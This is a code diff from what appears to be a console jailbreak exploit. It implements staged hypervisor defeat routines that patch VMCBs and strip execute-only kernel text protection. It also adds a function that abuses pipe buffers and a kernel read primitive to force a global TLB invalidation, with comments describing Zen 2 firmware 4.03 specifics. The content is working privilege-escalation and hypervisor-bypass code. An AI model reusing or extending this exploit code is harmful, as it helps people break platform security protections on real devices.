@@ -266,7 +266,7 @@ int stage3b_remove_xotext(hv_defeat_ctx *ctx) {
 
     for (uint64_t a = start; a < end; a += 0x1000) {
 
-        std::print("VA to unlock : {:x}\n", a);
+        //std::print("VA to unlock : {:x}\n", a);
 
         uint64_t pde, pde_a = find_pde(pmap, a, &pde);
         if (pde_a != ~0ULL) {
@@ -292,10 +292,10 @@ int stage3b_remove_xotext(hv_defeat_ctx *ctx) {
 
 
 int stage4_verify(hv_defeat_ctx *ctx) {
-    usleep(15000000);
+    usleep(5000000);
     std::print("\n[stage4] verify\n");
 
-    pin_to_first_available_core();
+    //pin_to_first_available_core();
 
     uint64_t ktext = kr8((uint64_t)KERNEL_ADDRESS_TEXT_BASE);
     uint64_t hvdata = kr8(ctx->hv_data_va);
@@ -532,9 +532,6 @@ int run_hv_defeat(void) { //uint64_t mp4_softc, uint64_t zcn_bar2) {
 
     if ((r = stage1_tmr_relax(&ctx))) return r;
 
-    // kernel_pmap_invalidate_all();
-    // return 0;
-
     if ((r = stage2_find_vmcbs(&ctx))) return r;
 
     if ((r = stage3_patch_vmcbs(&ctx))) return r;
@@ -543,7 +540,7 @@ int run_hv_defeat(void) { //uint64_t mp4_softc, uint64_t zcn_bar2) {
 
     if (true) {
 
-        // kernel_pmap_invalidate_all();
+        kernel_pmap_invalidate_all();
 
         stage4_verify(&ctx);
 
@@ -567,22 +564,23 @@ int run_hv_defeat(void) { //uint64_t mp4_softc, uint64_t zcn_bar2) {
     return 0;
 }
 
+
+// Credits: idlesauce
 // does pmap_invalidate_all(kernel_pmap)
 // on 4.03, pmap_pcid_enabled and invpcid_works are both 0 - it seems zen 2 doesnt support INVPCID
 // so this will do invltlb_glob invalidating all tlb caches, including global entries, on all cores
 int kernel_pmap_invalidate_all(void) {
 
-    std::print("Enter kernel_pmap_invalidate_all\n");
+    std::print("[stage3c] invalidate paging entries\n");
 
     static uint64_t two_zero_pages[PAGE_SIZE * 2] = {0};
 
-    std::print("0\n");
     int pipe_fds[2];
     // set O_NONBLOCK to avoid PIPE_DIRECTW
     if (pipe2(pipe_fds, O_NONBLOCK)) {
         return -1;
     }
-    std::print("1\n");
+
     // the pipe starts off as 1 page large - we need to write into the pipe so it will grow to BIG_PIPE_SIZE
     // we need to make sure pmap_invalidate_all doesnt use the one page fast path
     if (write(pipe_fds[1], two_zero_pages, PAGE_SIZE * 2) < 0) {
@@ -590,32 +588,32 @@ int kernel_pmap_invalidate_all(void) {
         close(pipe_fds[1]);
         return -1;
     }
-    std::print("2\n");
+
     // dont need this anymore
     close(pipe_fds[1]);
 
     uint64_t read_fd_file_data = kernel_get_proc_file(-1, pipe_fds[0]);
 
-    for (uint64_t i=0; i<0x40; i=i+8) {
-        uint64_t read_val;
-        kernel_copyout(read_fd_file_data + i, &read_val, sizeof(read_val));
-        std::print("Read value at add 0x{:016x} : 0x{:016x}\n", read_fd_file_data + i, read_val);
-    }
+    // for (uint64_t i=0; i<0x40; i=i+8) {
+    //     uint64_t read_val;
+    //     kernel_copyout(read_fd_file_data + i, &read_val, sizeof(read_val));
+    //     std::print("Read value at add 0x{:016x} : 0x{:016x}\n", read_fd_file_data + i, read_val);
+    // }
 
-    std::print("This is read_fd_file_data: {:016x}\n", read_fd_file_data);
+    // std::print("This is read_fd_file_data: {:016x}\n", read_fd_file_data);
     if (!INKERNEL(read_fd_file_data)) {
         close(pipe_fds[0]);
         return -1;
     }
-    std::print("2\n");
+
     uint64_t read_fd_buffer;
     kernel_copyout(read_fd_file_data + 0x10, &read_fd_buffer, sizeof(read_fd_buffer));
-    std::print("This isread_fd_buffer: {:016x}\n", read_fd_buffer);
+    // std::print("This isread_fd_buffer: {:016x}\n", read_fd_buffer);
     if (!INKERNEL(read_fd_buffer)) {
         close(pipe_fds[0]);
         return -1;
     }
-    std::print("4\n");
+
     // inside pmap_remove anyvalid has to be 1 for pmap_invalidate_all to be called
     // anyvalid is only set if there is at least 1 non global entry being removed
     // set the first entry as non global, its being removed anyway so its fine (?)
